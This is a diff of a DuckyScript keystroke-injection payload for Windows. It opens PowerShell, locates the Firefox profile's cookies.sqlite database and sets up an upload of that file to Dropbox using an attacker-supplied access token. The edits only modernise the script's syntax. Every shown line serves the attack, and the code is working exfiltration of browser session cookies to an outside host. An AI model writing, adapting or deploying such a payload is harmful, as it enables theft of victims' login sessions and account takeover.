@@ -16,31 +16,24 @@ REM     - Firefox must be installed
 REM You must define your Dropbox accessToken or modify the exfiltration modality. Replace just the example word with your token.
 DEFINE DROPBOX_ACCESS_TOKEN "example"
 
-
-DELAY 1000
+DEFAULT_DELAY 500
 GUI r
-DELAY 500
-STRING powershell
-DELAY 500
-ENTER
+STRINGLN powershell
 DELAY 2000
 
 
 REM Get cookies DB path
-STRINGLN
+STRINGLN_BLOCK
     $firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
     $firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}
-
     $filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'
-
 END_STRINGLN
 
 REM Setting about exfiltration
-STRING $accessToken = 
-STRING DROPBOX_ACCESS_TOKEN
+STRINGLN $accessToken = DROPBOX_ACCESS_TOKEN
 ENTER
 
-STRINGLN
+STRINGLN_BLOCK
     $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
     
     $dropboxFilePath = "/cookies_exported.sqlite"
